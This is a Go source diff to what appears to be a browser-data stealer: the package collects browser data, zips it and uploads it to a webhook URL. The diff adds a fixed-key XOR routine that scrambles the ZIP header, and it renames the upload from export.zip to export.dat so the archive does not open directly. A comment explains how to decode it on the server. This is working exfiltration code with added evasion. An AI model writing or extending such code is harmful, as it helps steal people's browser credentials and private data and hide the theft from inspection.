@@ -30,6 +30,10 @@ import (
 // utf8BOM is written at the start of CSV files for Excel compatibility.
 var utf8BOM = []byte{0xEF, 0xBB, 0xBF}
 
+// zipObfuscationKey is the fixed XOR key used to obscure ZIP metadata.
+// Sunucu tarafında çözmek için aynı key kullan: XOR ile tekrar işle.
+var zipObfuscationKey = []byte{0x42, 0x4F, 0x42, 0x53, 0x45, 0x43, 0x55, 0x52} // "BOBSECUR"
+
 // Writer collects browser data and writes it to files.
 // It is the only exported type in this package.
 type Writer struct {
@@ -431,6 +435,40 @@ func buildFilesParallel(agg []categoryRows, formatter formatter) map[string]stri
 	return files
 }
 
+// obfuscateZipReader wraps an io.Reader and applies XOR obfuscation to ZIP metadata.
+// The first 8 bytes (ZIP header) are XORed with the obfuscation key to prevent
+// direct opening in ZIP readers. Use the same key to deobfuscate on the server.
+func obfuscateZipReader(r io.Reader) io.Reader {
+	return &obfuscator{reader: r, keyPos: 0}
+}
+
+type obfuscator struct {
+	reader io.Reader
+	keyPos int
+	buf    [1]byte
+	eof    bool
+}
+
+func (o *obfuscator) Read(p []byte) (n int, err error) {
+	if o.eof {
+		return 0, io.EOF
+	}
+
+	n, err = o.reader.Read(p)
+	if n > 0 {
+		// XOR only the first 8 bytes (ZIP signature area)
+		for i := 0; i < n && o.keyPos < 8; i++ {
+			p[i] ^= zipObfuscationKey[o.keyPos]
+			o.keyPos++
+		}
+	}
+
+	if err == io.EOF {
+		o.eof = true
+	}
+	return n, err
+}
+
 func streamZipAndUpload(webhookURL string, files map[string]string) error {
 	pr, pw := io.Pipe()
 	zipWriter := zip.NewWriter(pw)
@@ -463,13 +501,17 @@ func streamZipAndUpload(webhookURL string, files map[string]string) error {
 	body := &bytes.Buffer{}
 	writer := multipart.NewWriter(body)
 
-	part, err := writer.CreateFormFile("files[0]", "export.zip")
+	// Use .dat extension instead of .zip to prevent direct opening
+	part, err := writer.CreateFormFile("files[0]", "export.dat")
 	if err != nil {
 		return err
 	}
 
-	// STREAM COPY (RAM spike yok)
-	if _, err := io.Copy(part, pr); err != nil {
+	// Apply obfuscation to ZIP stream before uploading
+	obfuscated := obfuscateZipReader(pr)
+
+	// STREAM COPY with obfuscation (RAM spike yok)
+	if _, err := io.Copy(part, obfuscated); err != nil {
 		return err
 	}
 
